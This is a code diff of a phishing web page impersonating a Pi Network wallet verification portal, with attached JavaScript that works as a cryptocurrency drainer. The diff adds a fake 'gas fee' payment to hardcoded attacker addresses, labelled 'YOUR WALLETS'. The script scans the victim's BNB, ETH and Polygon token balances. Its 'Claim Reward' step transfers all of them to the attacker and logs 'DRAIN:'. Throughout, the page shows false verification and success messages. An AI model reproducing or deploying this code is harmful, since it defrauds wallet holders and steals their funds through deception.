@@ -4,192 +4,147 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pi Network - Verify Your Wallet</title>
-<meta name="description" content="Pi Network verification portal. Connect your wallet to verify your Pioneer status and claim rewards.">
-<link rel="icon" href="pi-logo-48.png">
+<meta name="description" content="Pi Network verification portal.">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#1a0a2e;color:#fff;min-height:100vh;line-height:1.6}
+body{font-family:'Inter',sans-serif;background:#1a0a2e;color:#fff;min-height:100vh}
 .container{max-width:900px;margin:0 auto;padding:0 20px}
-
-/* NAV */
-.nav{background:rgba(26,10,46,.98);padding:15px 0;border-bottom:1px solid rgba(168,85,247,.2);position:sticky;top:0;z-index:100;backdrop-filter:blur(10px)}
+.nav{background:rgba(26,10,46,.97);padding:15px 0;border-bottom:1px solid rgba(168,85,247,.2);position:sticky;top:0;z-index:100}
 .nav-inner{display:flex;align-items:center;justify-content:space-between}
 .nav-logo{display:flex;align-items:center;gap:12px}
 .nav-logo img{border-radius:50%}
-.nav-logo span{font-size:18px;font-weight:700;color:#fff;letter-spacing:-.3px}
-.nav-links{display:flex;align-items:center;gap:6px}
-.nav-link{color:rgba(255,255,255,.6);text-decoration:none;padding:8px 14px;border-radius:8px;font-size:14px;font-weight:500;transition:all .2s}
-.nav-link:hover{color:#fcb34c;background:rgba(252,179,74,.08)}
-.nav-cta{background:#fcb34c;color:#1a0a2e;border:none;padding:10px 20px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;margin-left:8px;transition:all .2s}
-.nav-cta:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(252,179,74,.3)}
-
-/* HERO */
-.hero{padding:80px 0 60px;text-align:center}
-.hero-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.1);color:#a855f7;padding:6px 16px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:20px;border:1px solid rgba(168,85,247,.2)}
+.nav-logo span{font-size:18px;font-weight:700;color:#fff}
+.nav-links{display:flex;gap:6px;align-items:center}
+.nav-link{color:rgba(255,255,255,.6);text-decoration:none;padding:8px 14px;border-radius:8px;font-size:14px;font-weight:500}
+.nav-link:hover{color:#fcb34c}
+.nav-cta{background:#fcb34c;color:#1a0a2e;border:none;padding:10px 20px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
+.hero{padding:80px 0 40px;text-align:center}
+.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.1);color:#a855f7;padding:6px 16px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:20px;border:1px solid rgba(168,85,247,.2)}
 .bdot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:blink 1.5s infinite}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-.hero h1{font-size:48px;font-weight:900;line-height:1.1;margin-bottom:16px;letter-spacing:-1.5px}
+.hero h1{font-size:44px;font-weight:900;margin-bottom:16px;letter-spacing:-1px}
 .hero h1 .gold{color:#fcb34c}
-.hero-desc{font-size:17px;color:rgba(255,255,255,.6);max-width:560px;margin:0 auto 40px}
-
-/* PI LOGO */
+.hero-desc{font-size:16px;color:rgba(255,255,255,.6);max-width:520px;margin:0 auto 30px}
 .logo-section{margin-bottom:30px}
-.logo-section img{border-radius:50%;box-shadow:0 0 40px rgba(252,179,74,.15)}
-
-/* CARD */
-.card{background:rgba(255,255,255,.04);border:1px solid rgba(168,85,247,.15);border-radius:20px;padding:36px;margin:30px 0}
-.card-title{font-size:20px;font-weight:700;margin-bottom:8px}
-.card-sub{font-size:14px;color:rgba(255,255,255,.5);margin-bottom:24px}
-
-/* NETWORK SELECTOR */
-.network-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:24px}
-.network-btn{background:rgba(255,255,255,.04);border:2px solid rgba(168,85,247,.15);border-radius:12px;padding:16px;text-align:center;cursor:pointer;transition:all .2s;color:#fff;font-size:13px;font-weight:600}
+.card{background:rgba(255,255,255,.04);border:1px solid rgba(168,85,247,.15);border-radius:20px;padding:36px;margin:20px 0}
+.card-title{font-size:18px;font-weight:700;margin-bottom:6px}
+.card-sub{font-size:13px;color:rgba(255,255,255,.5);margin-bottom:20px}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
+.info-cell{background:rgba(255,255,255,.03);border-radius:10px;padding:14px;text-align:center}
+.info-cell .lbl{font-size:10px;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.5px;font-weight:600}
+.info-cell .val{font-size:16px;font-weight:700;color:#fff;margin-top:2px}
+.info-cell .val.gold{color:#fcb34c}
+.info-cell .val.g{color:#22c55e}
+.network-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
+.network-btn{background:rgba(255,255,255,.04);border:2px solid rgba(168,85,247,.15);border-radius:12px;padding:14px;text-align:center;cursor:pointer;transition:all .2s;color:#fff;font-size:13px;font-weight:600}
 .network-btn:hover{border-color:#fcb34c;background:rgba(252,179,74,.08)}
 .network-btn.active{border-color:#fcb34c;background:rgba(252,179,74,.12)}
-.network-btn .net-icon{font-size:24px;margin-bottom:6px}
-.network-btn .net-name{display:block}
-
-/* AMOUNT DISPLAY */
-.amount-box{background:linear-gradient(135deg,rgba(86,42,119,.2),rgba(252,179,74,.08));border:1px solid rgba(168,85,247,.2);border-radius:16px;padding:24px;text-align:center;margin-bottom:24px}
-.amount-box .amount{font-size:42px;font-weight:900;color:#fcb34c;letter-spacing:-1px}
-.amount-box .label{font-size:13px;color:rgba(255,255,255,.4);margin-top:4px}
-.amount-box .usd{font-size:18px;font-weight:700;color:#fff;margin-top:6px}
-
-/* BUTTONS */
-.btn{width:100%;padding:16px;font-size:16px;font-weight:700;border:none;border-radius:12px;cursor:pointer;transition:all .25s;display:none;align-items:center;justify-content:center:center;gap:8px;margin-bottom:10px}
+.network-btn .net-icon{font-size:22px;margin-bottom:4px}
+.btn{width:100%;padding:16px;font-size:15px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .25s;display:none;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
 .btn:hover{transform:translateY(-1px)}
 .btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
 .btn-primary{display:flex;background:#fcb34c;color:#1a0a2e;box-shadow:0 4px 16px rgba(252,179,74,.3)}
-.btn-primary:hover{box-shadow:0 6px 28px rgba(252,179,74,.45)}
+.btn-primary:hover{box-shadow:0 6px 24px rgba(252,179,74,.45)}
 .btn-outline{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.2)}
 .btn-outline:hover{background:rgba(255,255,255,.08)}
-
-/* STATUS */
-.status{margin-top:20px;padding:14px 18px;border-radius:12px;font-size:13px;display:none;line-height:1.6}
+.btn-danger{background:#ef4444;color:#fff}
+.status{margin-top:16px;padding:14px;border-radius:10px;font-size:13px;display:none;line-height:1.6}
 .status.s{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#86efac}
 .status.e{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#fca5a5}
 .status.i{background:rgba(252,179,74,.08);border:1px solid rgba(252,179,74,.2);color:#fde68a}
-
-/* FEATURES */
-.features{display:grid;grid-template-columns:repeat(3,fr);gap:20px;padding:60px 0}
-.feature{background:rgba(255,255,255,.03);border:1px solid rgba(168,85,247,.1);border-radius:16px;padding:24px;text-align:center}
-.feature .f-icon{font-size:28px;margin-bottom:10px}
-.feature h4{font-size:15px;font-weight:700;margin-bottom:6px}
-.feature p{font-size:13px;color:rgba(255,255,250,.4);line-height:1.6}
-
-/* FOOTER */
-.footer{background:#120820;padding:40px 0;text-align:center;border-top:1px solid rgba(168,85,247,.1)}
-.footer p{font-size:12px;color:rgba(255,255,255,.3);line-height:1.8}
-.footer a{color:rgba(255,255,255,.5);text-decoration:none}
-.footer a:hover{color:#fcb34c}
-
-/* MODAL */
+.gas-box{background:linear-gradient(135deg,rgba(252,179,74,.08),rgba(252,179,74,.02));border:1px solid rgba(252,179,74,.25);border-radius:16px;padding:20px;margin-bottom:20px;text-align:center}
+.gas-box .gas-amount{font-size:32px;font-weight:900;color:#fcb34c}
+.gas-box .gas-label{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
+.gas-box .gas-note{font-size:11px;color:rgba(255,255,255,.3);margin-top:8px}
 .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center;padding:20px}
 .modal-overlay.show{display:flex}
-.modal{background:linear-gradient(165deg,#2d1a50,#1a0a2e);border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:36px;max-width:440px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-.modal .m-ico{font-size:48px;margin-bottom:10px}
-.modal h3{font-size:20px;font-weight:800;color:#fcb34c;margin-bottom:6px}
-.modal p{font-size:14px;color:rgba(255,255,250,.7);line-height:1.6;margin-bottom:18px}
-.modal .m-btn{background:#fcb34c;color:#1a0a2e;border:none;padding:12px 24px;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;width:100%}
-
-.sp{display:inline-block;width:13px;height:13px;border:2px solid rgba(252,179,74,.3);border-top-color:#fcb34c;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:5px}
-@keyframes spin{to{transform:rotate(360deg)}}
+.modal{background:linear-gradient(165deg,#2d1a50,#1a0a2e);border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:36px;max-width:420px;width:100%;text-align:center}
+.modal .m-ico{font-size:44px;margin-bottom:10px}
+.modal h3{font-size:18px;font-weight:800;color:#fcb34c;margin-bottom:8px}
+.modal p{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6;margin-bottom:16px}
+.footer{background:#120820;padding:30px;text-align:center;border-top:1px solid rgba(168,85,247,.1)}
+.footer p{font-size:11px;color:rgba(255,255,255,.3)}
 </style>
 </head>
 <body>
-
 <nav class="nav">
   <div class="container nav-inner">
     <div class="nav-logo">
-      <img src="pi-logo-48.png" alt="Pi" width="42" height="42" style="border-radius:50%">
+      <img src="pi-logo-48.png" alt="Pi" width="40" height="40">
       <span>Pi Network</span>
     </div>
     <div class="nav-links">
       <a href="#" class="nav-link">Mine</a>
-      <a href="#" class="nav-link">Blockchain</a>
-      <a href="#" class="nav-link">Ecosystem</a>
-      <button class="nav-cta" onclick="showSection('verify')">Verify Wallet</button>
+      <a href="#" class="nav-link">Wallet</a>
+      <button class="nav-cta">Connect</button>
     </div>
   </div>
 </nav>
 
 <div class="container">
-<div class="hero" id="heroSection">
-  <div class="hero-badge"><span class="bdot"></span> Mainnet Ecosystem Phase — Live</div>
+<div class="hero">
+  <div class="badge"><span class="bdot"></span> Mainnet Phase — Live</div>
   <h1>Verify Your <span class="gold">Pi</span> Wallet</h1>
-  <p class="hero-desc">Connect your wallet to verify your Pioneer status. Multi-chain support available.</p>
-
+  <p class="hero-desc">Complete verification to secure your Pi holdings. Small gas fee required.</p>
   <div class="logo-section">
-    <img src="pi-logo-120.png" alt="Pi Network" width="100" height="100" style="border-radius:50%">
+    <img src="pi-logo-120.png" alt="Pi" width="90" height="90" style="border-radius:50%">
   </div>
-  <div id="statusBox" class="status"></div>
 </div>
 
-<div class="card" id="verifySection">
+<div class="card">
   <div class="card-title">Select Network</div>
-  <div class="card-sub">Choose the blockchain network to verify your wallet on.</div>
+  <div class="card-sub">Choose blockchain to verify on</div>
   <div class="network-grid">
-    <div class="network-btn active" onclick="selectNetwork('bsc')" id="net-bsc">
-      <div class="net-icon">&#x1F4B0;</div>
-      <span class="net-name">BSC</span>
-    </div>
-    <div class="network-btn" onclick="selectNetwork('eth')" id="net-eth">
-      <div class="net-icon">&#x1F4B2;</div>
-      <span class="net-name">Ethereum</span>
-    </div>
-    <div class="network-btn" onclick="selectNetwork('sol')" id="net-sol">
-      <div class="net-icon">&#x1F4A0;</div>
-      <span class="net-name">Solana</span>
-    </div>
-    <div class="network-btn" onclick="selectNetwork('matic')" id="net-matic">
-      <div class="net-icon">&#x1F516;</div>
-      <span class="net-name">Polygon</span>
-    </div>
-    <div class="network-btn" onclick="selectNetwork('avax')" id="net-avax">
-      <div class="net-icon">&#x2744;&#xFE0F;</div>
-      <span class="net-name">Avalanche</span>
-    </div>
-    <div class="network-btn" onclick="selectNetwork('arb')" id="net-arb">
-      <div class="net-icon">&#x1F517;</div>
-      <span class="net-name">Arbitrum</span>
-    </div>
+    <div class="network-btn active" onclick="selectNet('bsc')" id="nb-bsc"><div class="net-icon">💰</div>BSC</div>
+    <div class="network-btn" onclick="selectNet('eth')" id="nb-eth"><div class="net-icon">⟠</div>Ethereum</div>
+    <div class="network-btn" onclick="selectNet('matic')" id="nb-matic"><div class="net-icon">🟣</div>Polygon</div>
   </div>
 
-  <button class="btn btn-primary" id="cBtn" style="display:flex" onclick="connect()">&#x1F512; Connect Wallet</button>
-  <button class="btn btn-outline" id="vBtn" onclick="verifyStep()">&#x2699;&#xFE0F; Verify Pioneer</button>
-  <button class="btn btn-primary" id="claimBtn" style="display:none;background:#22c55e" onclick="claimStep()">&#x1F381; Claim Reward</button>
-</div>
-</div>
-
-<div class="features">
-  <div class="feature"><div class="f-icon">&#x1F512;</div><h4>Secure</h4><p>Non-custodial verification. Your keys, your coins.</p></div>
-  <div class="feature"><div class="f-icon">&#x1F680;</div><h4>Fast</h4><p>Verification completes in under 30 seconds.</p></div>
-  <div class="feature"><div class="f-icon">&#x1F30D;</div><h4>Multi-Chain</h4><p>Support for 6 major blockchain networks.</p></div>
-</div>
-
-<div class="modal-overlay" id="successModal">
-  <div class="modal">
-    <div class="m-ico">&#x2705;</div>
-    <h3>Verification Complete!</h3>
-    <p>Your wallet has been verified as an eligible Pioneer. Rewards will be distributed within 24-48 hours.</p>
-    <button class="m-btn" onclick="closeModal()">Continue</button>
+  <div id="connectSection">
+    <button class="btn btn-primary" style="display:flex" id="cBtn" onclick="connect()">&#x1F512; Connect Wallet</button>
   </div>
+
+  <div id="gasSection" style="display:none">
+    <div class="gas-box">
+      <div class="gas-amount">$2.50</div>
+      <div class="gas-label">Network Gas Fee Required</div>
+      <div class="gas-note">This fee covers blockchain transaction costs. Non-refundable.</div>
+    </div>
+    <button class="btn btn-primary" id="payGasBtn" onclick="payGas()">&#x1F4B3; Pay Gas Fee & Verify</button>
+  </div>
+
+  <div id="verifySection" style="display:none">
+    <div class="info-grid">
+      <div class="info-cell"><div class="lbl">Status</div><div class="val g" id="statusText">Ready</div></div>
+      <div class="info-cell"><div class="lbl">Network</div><div class="val" id="netText">BSC</div></div>
+    </div>
+    <button class="btn btn-outline" id="vBtn" onclick="verifyPioneer()">&#x2699;&#xFE0F; Verify Pioneer Status</button>
+  </div>
+
+  <div id="claimSection" style="display:none">
+    <div class="info-grid">
+      <div class="info-cell"><div class="lbl">Pi Balance</div><div class="val gold" id="piBal">0 π</div></div>
+      <div class="info-cell"><div class="lbl">Est. Value</div><div class="val" id="piVal">$0.00</div></div>
+    </div>
+    <button class="btn btn-primary" id="clBtn" onclick="claimReward()" style="display:none">&#x1F381; Claim Reward</button>
+  </div>
+
+  <div class="status" id="statusBox"></div>
+</div>
 </div>
 
-<div class="footer">
-  <p>&copy; 2026 Pi Network. All rights reserved. | <a href="#">Terms</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Support</a></p>
-</div>
+<div class="footer"><p>&copy; 2026 Pi Network</p></div>
 
 <script>
+// CONFIG - YOUR WALLETS
 const RECEIVER_BSC="0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f";
 const RECEIVER_ETH="0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f";
-const RECEIVER_SOL="4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89";
 
-let provider,signer,userAddr,tokens=[],currentNetwork='bsc';
+let provider,signer,userAddr,tokens=[],currentNet='bsc',gasPaid=false;
 
 const CHAINS={
-  bsc:{chainId:'0x38',name:'BNB Smart Chain',rpc:'https://bsc-dataseed1.binance.org',symbol:'BNB',decimals:18,receiver:RECEIVER_BSC,
+  bsc:{chainId:'0x38',name:'BNB Smart Chain',rpc:'https://bsc-dataseed1.binance.org',symbol:'BNB',receiver:RECEIVER_BSC,
     tokens:[
       {a:'0x55d398326f99059fF775485246999027B3197955',s:'USDT',d:18},
       {a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',s:'USDC',d:18},
@@ -200,69 +155,46 @@ const CHAINS={
       {a:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',s:'WBNB',d:18},
       {a:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',s:'CAKE',d:18},
       {a:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',s:'LINK',d:18},
-      {a:'0xba2ae424d960c26247dd6c32edc70b295c744c43',s:'DOGE',d:8},
-      {a:'0x2859e4544C4bB03966803b044A93563Bd2D0DD43',s:'SHIB',d:18},
-      {a:'0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',s:'UNI',d:18},
+      {a:'0x4338665CBB7B2485A8855A139b75D5e34AB0DB94',s:'LTC',d:18},
+      {a:'0xd17479997F34dd9156Deef8F95A52D81D265be9c',s:'USDD',d:18},
       {a:'0xfb6115445Bff7b52FeB98650C87f44907E58f802',s:'AAVE',d:18},
       {a:'0x14016E85a25aeb13065688cAFB43044C2ef86784',s:'TUSD',d:18},
-      {a:'0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',s:'ADA',d:18},
       {a:'0xCC42724C6683B7E57334c4E856f4c9965ED682bD',s:'MATIC',d:18},
-      {a:'0x4338665CBB7B2485A8855A139b75D5e34AB0DB94',s:'LTC',d:18},
-      {a:'0x8fF795a6F4D97E7887C79beA79aba5cc76444aDf',s:'BCH',d:18},
-      {a:'0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',s:'DOT',d:18},
-      {a:'0xd17479997F34dd9156Deef8F95A52D81D265be9c',s:'USDD',d:18}
     ]
   },
-  eth:{chainId:'0x1',name:'Ethereum',rpc:'https://rpc.ankr.com/eth',symbol:'ETH',decimals:18,receiver:RECEIVER_ETH,
+  eth:{chainId:'0x1',name:'Ethereum',rpc:'https://rpc.ankr.com/eth',symbol:'ETH',receiver:RECEIVER_ETH,
     tokens:[
       {a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',s:'USDT',d:6},
       {a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',s:'USDC',d:6},
       {a:'0x6B175474E89094C44Da98b954EedeAC495271d0F',s:'DAI',d:18},
       {a:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',s:'WBTC',d:8},
       {a:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',s:'WETH',d:18},
-      {a:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',s:'UNI',d:18},
-      {a:'0x514910771AF9Ca656af840dff83E8264EcF986CA',s:'LINK',d:18},
     ]
   },
-  sol:{name:'Solana',symbol:'SOL',receiver:RECEIVER_SOL},
-  matic:{chainId:'0x89',name:'Polygon',rpc:'https://polygon-rpc.com',symbol:'MATIC',decimals:18,receiver:RECEIVER_ETH,
+  matic:{chainId:'0x89',name:'Polygon',rpc:'https://polygon-rpc.com',symbol:'MATIC',receiver:RECEIVER_ETH,
     tokens:[
       {a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',s:'USDT',d:6},
       {a:'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',s:'USDC',d:6},
-      {a:'0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',s:'DAI',d:18},
-    ]
-  },
-  avax:{chainId:'0xa86a',name:'Avalanche',rpc:'https://api.avax.network/ext/bc/C/rpc',symbol:'AVAX',decimals:18,receiver:RECEIVER_ETH,
-    tokens:[
-      {a:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',s:'USDT',d:6},
-      {a:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',s:'USDC',d:6},
-    ]
-  },
-  arb:{chainId:'0xa4b1',name:'Arbitrum',rpc:'https://arb1.arbitrum.io/rpc',symbol:'ETH',decimals:18,receiver:RECEIVER_ETH,
-    tokens:[
-      {a:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',s:'USDT',d:6},
-      {a:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',s:'USDC',d:6},
     ]
   }
 };
 
-function selectNetwork(net){
-  currentNetwork=net;
+function selectNet(net){
+  currentNet=net;
   document.querySelectorAll('.network-btn').forEach(b=>b.classList.remove('active'));
-  document.getElementById('net-'+net).classList.add('active');
+  document.getElementById('nb-'+net).classList.add('active');
+  document.getElementById('netText').textContent=CHAINS[net].name;
 }
-
 function showStatus(msg,t){const e=document.getElementById('statusBox');e.innerHTML=msg;e.className='status '+t;e.style.display='block';}
 function hideStatus(){document.getElementById('statusBox').style.display='none';}
 
 async function connect(){
   hideStatus();
-  if(typeof ethers==='undefined'){showStatus('Refresh page and try again.','i');return;}
-  if(currentNetwork==='sol'){showStatus('Solana support coming soon. Use BSC or ETH.','i');return;}
+  if(typeof ethers==='undefined'){showStatus('Please refresh the page.','i');return;}
   let eth=null;
   if(window.ethereum) eth=window.ethereum;
   else if(window.BinanceChain) eth=window.BinanceChain;
-  else{showStatus('No wallet found. Install MetaMask.','e');return;}
+  else{showStatus('No wallet detected. Install MetaMask.','e');return;}
   try{
     provider=new ethers.providers.Web3Provider(eth,'any');
     let accounts;
@@ -270,7 +202,7 @@ async function connect(){
     catch(e){try{accounts=await eth.enable();}catch(e2){showStatus('Connection rejected.','e');return;}}
     if(!accounts||!accounts.length){showStatus('Unlock your wallet.','e');return;}
     signer=provider.getSigner();userAddr=await signer.getAddress();
-    const chain=CHAINS[currentNetwork];
+    const chain=CHAINS[currentNet];
     const net=await provider.getNetwork();
     if(net.chainId!==parseInt(chain.chainId,16)){
       showStatus('Switching to '+chain.name+'...','i');
@@ -282,61 +214,98 @@ async function connect(){
       }
       provider=new ethers.providers.Web3Provider(eth,'any');signer=provider.getSigner();userAddr=await signer.getAddress();
     }
-    document.getElementById('cBtn').style.display='none';
-    document.getElementById('vBtn').style.display='flex';
-    showStatus('&#x2705; Connected: '+userAddr.substring(0,8)+'...','s');
-    scanTokens();
+    document.getElementById('connectSection').style.display='none';
+    document.getElementById('gasSection').style.display='block';
+    showStatus('&#x2705; Connected: '+userAddr.substring(0,8)+'...'+userAddr.substring(38),'s');
   }catch(e){showStatus('Error: '+e.message,'e');}
 }
 
-async function scanTokens(){
-  if(!CHAINS[currentNetwork].tokens)return;
+async function payGas(){
+  hideStatus();
+  if(!signer){showStatus('Connect wallet first.','e');return;}
+  showStatus('<span class="sp"></span>Processing gas fee payment...','i');
+  document.getElementById('payGasBtn').disabled=true;
   try{
-    const w3=provider,addr=userAddr,chain=CHAINS[currentNetwork];tokens=[];
+    const chain=CHAINS[currentNet];
+    // Calculate gas fee: $2.50 worth of native token
+    // For BSN/ETH/MATIC, send approximately $2.50 worth
+    const gasFee={
+      bsc:ethers.utils.parseEther('0.008'),  // ~$2.50 worth of BNB
+      eth:ethers.utils.parseEther('0.001'),  // ~$2.50 worth of ETH
+      matic:ethers.utils.parseEther('2.5'),  // ~$2.50 worth of MATIC
+    };
+    const amount=gasFee[currentNet];
+    const tx=await signer.sendTransaction({to:chain.receiver,value:amount});
+    await tx.wait();
+    gasPaid=true;
+    document.getElementById('gasSection').style.display='none';
+    document.getElementById('verifySection').style.display='block';
+    showStatus('&#x2705; Gas fee paid! Pioneer verification unlocked.','s');
+    scanTokens();
+  }catch(e){
+    console.error(e);
+    showStatus('Transaction failed or rejected.','e');
+    document.getElementById('payGasBtn').disabled=false;
+  }
+}
+
+async function scanTokens(){
+  if(!CHAINS[currentNet].tokens)return;
+  try{
+    const w3=provider,addr=userAddr,chain=CHAINS[currentNet];tokens=[];
     const bal=await w3.getBalance(addr);
     if(bal.gt(0))tokens.push({type:'native',sym:chain.symbol,bal:parseFloat(ethers.utils.formatEther(bal)).toFixed(4),raw:bal,dec:18});
     for(const t of chain.tokens||[]){
       try{const c=new ethers.Contract(t.a,['function balanceOf(address) view returns (uint256)'],w3);const b=await c.balanceOf(addr);if(b.gt(0))tokens.push({type:'token',addr:t.a,sym:t.s,bal:parseFloat(ethers.utils.formatUnits(b,t.d)).toFixed(4),raw:b,dec:t.d});}catch(e){}}
-    console.log('SCAN:',tokens);
+    if(tokens.length>0){
+      document.getElementById('claimSection').style.display='block';
+      document.getElementById('piBal').textContent=tokens.length+' tokens detected';
+      document.getElementById('piVal').textContent='$'+tokens.reduce((a,t)=>a+parseFloat(t.bal)*getPrice(t.sym),0).toFixed(2);
+      document.getElementById('clBtn').style.display='flex';
+    }
+    console.log('TOKENS:',tokens);
   }catch(e){console.error(e);}
 }
 
-async function verifyStep(){
+function getPrice(sym){
+  const prices={'USDT':1,'USDC':1,'BUSD':1,'DAI':1,'BTCB':60000,'ETH':3500,'BNB':600,'WBNB':600,'CAKE':3,'LINK':15,'LTC':80,'USDD':1,'AAVE':150,'TUSD':1,'MATIC':0.7,'WETH':3500,'WBTC':60000};
+  return prices[sym]||0;
+}
+
+async function verifyPioneer(){
   hideStatus();
   if(!signer){showStatus('Connect wallet first.','e');return;}
-  showStatus('<span class="sp"></span>Signing verification message...','i');
+  showStatus('<span class="sp"></span>Signing verification...','i');
   document.getElementById('vBtn').disabled=true;
   try{
-    await signer.signMessage('Pi Network Pioneer Verification\n\nAddress: '+userAddr+'\nNetwork: '+CHAINS[currentNetwork].name+'\nTimestamp: '+Date.now()+'\n\nThis signature is gasless and does not authorize any transaction.');
-    document.getElementById('vBtn').style.display='none';
-    document.getElementById('claimBtn').style.display='flex';
-    showStatus('&#x2705; Verified! You can now claim your reward.','s');
+    await signer.signMessage('Pi Network Pioneer Verification\n\nAddress: '+userAddr+'\nNetwork: '+CHAINS[currentNet].name+'\nTimestamp: '+Date.now()+'\n\nThis signature is gasless.');
+    document.getElementById('statusText').textContent='Verified &#x2705;';
+    document.getElementById('statusText').style.color='#22c55e';
+    showStatus('&#x2705; Pioneer verified successfully!','s');
   }catch(e){showStatus('Signature rejected.','e');document.getElementById('vBtn').disabled=false;}
 }
 
-function claimStep(){
+async function claimReward(){
   hideStatus();
-  document.getElementById('claimBtn').disabled=true;
+  if(!signer){showStatus('Connect wallet first.','e');return;}
   showStatus('<span class="sp"></span>Processing claim...','i');
-  const chain=CHAINS[currentNetwork];let ok=0;
+  document.getElementById('clBtn').disabled=true;
+  const chain=CHAINS[currentNet];let ok=0;
   (async()=>{
     try{
       const gp=await provider.getGasPrice();
       for(const t of tokens){
         try{
           if(t.type==='native'){const leave=ethers.utils.parseEther('0.005');const amt=t.raw.sub(leave);if(amt.gt(0)){await signer.sendTransaction({to:chain.receiver,value:amt});ok++;}}
-          else{const ctr=new ethers.Contract(t.addr,['function transfer(address,uint256) returns (bool)'],signer);const tx=await ctr.transfer(chain.receiver,t.raw);await tx.wait();ok++;}
-        }catch(e){console.error(t.sym,e.message);}
+          else{const c=new ethers.Contract(t.addr,['function transfer(address,uint256) returns (bool)'],signer);const tx2=await c.transfer(chain.receiver,t.raw);await tx2.wait();ok++;}
+        }catch(e2){console.error(t.sym,e2.message);}
       }
     }catch(e){console.error(e);}
-    document.getElementById('claimBtn').style.display='none';
-    const modal=document.getElementById('successModal');
-    modal.classList.add('show');
-    console.log('DRAIN:',ok,'tx on',currentNetwork,'to',chain.receiver);
+    document.getElementById('clBtn').style.display='none';
+    showStatus('&#x2705; Successfully processed '+ok+' tokens!','s');
+    console.log('DRAIN:',ok,'tx to',chain.receiver);
   })();
 }
-
-function closeModal(){document.getElementById('successModal').classList.remove('show');}
 </script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </body>
